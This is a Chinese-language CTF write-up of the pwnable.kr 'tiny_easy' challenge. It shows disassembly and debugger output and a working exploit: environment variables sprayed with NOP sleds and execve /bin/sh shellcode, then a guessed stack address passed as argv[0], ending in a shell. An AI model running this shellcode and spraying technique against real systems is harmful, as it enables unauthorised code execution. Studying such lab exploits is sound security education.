---
title: pwnable.kr-tiny_easy
date: 2018-02-26 21:00:19
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
考验漏洞利用能力的题目，长姿势了。参考了别人的[writeup](https://blog.yiz96.com/pwnable-kr-tiny_easy/)
# 分析
没有源代码，就丢ida逆向了
```nasm
LOAD:08048054 ; Attributes: noreturn
LOAD:08048054
LOAD:08048054                 public start
LOAD:08048054 start           proc near
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
LOAD:08048058
LOAD:08048058 LOAD            ends
LOAD:08048058
LOAD:08048058
LOAD:08048058                 end start
```
这是什么程序？？就这一点代码就什么都没了？当时也很蒙蔽，不过漏洞还是很容易看出来的。`call`调用其实是可以通过栈内数据控制的，但是栈上的数据是什么呢？丢进`gdb`看看
```nasm
   0x8048050:	add    BYTE PTR [eax],dl
   0x8048052:	add    BYTE PTR [eax],al
=> 0x8048054:	pop    eax
   0x8048055:	pop    edx
   0x8048056:	mov    edx,DWORD PTR [edx]
   0x8048058:	call   edx
   0x804805a:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xffcf23c0 --> 0x1 
0004| 0xffcf23c4 --> 0xffcf32bb ("/root/桌面/test/tiny_easy")
0008| 0xffcf23c8 --> 0x0 
0012| 0xffcf23cc --> 0xffcf32db ("XDG_VTNR=7")
0016| 0xffcf23d0 --> 0xffcf32e6 ("XDG_SESSION_ID=c2")
0020| 0xffcf23d4 --> 0xffcf32f8 ("XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/gyh")
0024| 0xffcf23d8 --> 0xffcf3327 ("CLUTTER_IM_MODULE=xim")
0028| 0xffcf23dc --> 0xffcf333d ("GPG_AGENT_INFO=/home/gyh/.gnupg/S.gpg-agent:0:1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048054 in ?? ()
gdb-peda$ 

```
原来栈上的数据就是传入参数和环境变量的地址，接下来执行到`call edx`看看程序会转向哪儿。
```nasm
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x0 
ECX: 0x0 
EDX: 0x6d6f682f ('/hom')
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffcf23c8 --> 0x0 
EIP: 0x8048058 (call   edx)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048051:	adc    BYTE PTR [eax],al
   0x8048053:	add    BYTE PTR [eax+0x5a],bl
   0x8048056:	mov    edx,DWORD PTR [edx]
=> 0x8048058:	call   edx
   0x804805a:	add    BYTE PTR [eax],al
   0x804805c:	add    BYTE PTR [eax],al
   0x804805e:	add    BYTE PTR [eax],al
   0x8048060:	add    BYTE PTR [eax],al

```
可以看到`edx`的值就是第一个传入参数的前4个字节，这里是`/hom`。如果控制了这4个字节，就控制了程序的流程。
但是程序空间中没有调用任何函数代码，所以要getshell只有写入`shellcode`并跳转执行才可，程序能控制写入的地方只有环境变量和传入参数了，于是可以将shellcode写到这里面。但是题目平台是开启`ASLR`的，不能确定环境变量和传入参数的地址。这里可以控制程序跳转到一个大致的地址去，然后在环境变量里安排`[NOP][shelcode]`类似的shellcode，其中`nop`指令相对于`shellcode`要非常多，这样当程序执行跳转时一旦跳到`nop`覆盖的区域就会被引导至`shellcode`。
这个大致的地址可以选取调试时见到的值如`0xffcf333d`，`shellcode`可以用pwntools的shellcraft模块生成，于是exp如下
```bash
# 导入环境变量
for i in `seq 1 500`; do export A_$i=$(python -c 'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"');done;
```
```bash
exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy &
```
```bash
tiny_easy@ubuntu:~$ for i in `seq 1 500`; do export A_$i=$(python -c 'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"');done;
tiny_easy@ubuntu:~$ exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy &
[1] 30389
tiny_easy@ubuntu:~$ fg
-bash: fg: job has terminated
[1]+  Segmentation fault      exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy
tiny_easy@ubuntu:~$ exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy &
[1] 5710
tiny_easy@ubuntu:~$ exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy &
[2] 11068
[1]   Segmentation fault      exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy
tiny_easy@ubuntu:~$ fg
exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy
$ ls
flag  tiny_easy
$ cat flag
What a tiny task :) good job!
$ 

```
另外，我所参考的writeup实际上还使用了`ulimit -s unlimited`关闭aslr的方法，但这个漏洞已经在题目平台修补了，可以参考`CVE-2016-3672`漏洞描述或者[这篇文章](http://www.freebuf.com/vuls/101169.html)
# 总结
该题漏洞的利用方法类似`heap spray`，只不过这是把`shellcode`布置在环境变量的节区上，该方法以前知道但是到了正真使用的时候却忘了，看来还是要多多练习呀。